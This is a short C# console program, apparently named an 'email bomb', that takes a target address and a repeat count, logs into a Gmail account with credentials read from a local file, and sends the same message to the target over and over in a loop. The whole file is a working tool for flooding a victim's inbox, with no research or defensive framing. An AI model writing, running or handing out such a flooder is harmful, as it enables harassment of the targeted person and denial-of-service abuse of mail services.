using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Mail;
using System.Net;

namespace Email_Bomb__Cs_
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Target, then reps.");
            string target = Console.ReadLine();
            string[] str = System.IO.File.ReadAllLines(@"Email.txt");
            string Str = "";
            foreach (string line in str)
            {
                Str = Str + line;
            }
            string[] info = System.IO.File.ReadAllLines(@"Info.secret");
            int max = Int32.Parse(Console.ReadLine());

            var fromAddress = new MailAddress(info[0], "From Name");
            var toAddress = new MailAddress(target, "To Name");
            string fromPassword = info[1];
            const string subject = "";
            string body = Str;

            var smtp = new SmtpClient
            {
                Host = "smtp.gmail.com",
                Port = 587,
                EnableSsl = true,
                DeliveryMethod = SmtpDeliveryMethod.Network,
                UseDefaultCredentials = false,
                Credentials = new NetworkCredential(fromAddress.Address, fromPassword)
            };
            using (var message = new MailMessage(fromAddress, toAddress)
            {
                Subject = subject,
                Body = body
            })
            {
                Console.Write("Sent: ");
                int[] cursor = new int[2];
                cursor[0] = Console.CursorLeft;
                cursor[1] = Console.CursorTop;
                for (int i = 0; i < max; i++)
                { 
                    Console.SetCursorPosition(cursor[0], cursor[1]);
                    try
                    {
                        Console.Write(i);
                        smtp.Send(message);
                    }
                    catch
                    {
                        Console.WriteLine("");
                        Console.WriteLine("Failed");
                        break;
                    }
                }
            }
        }
    }
}
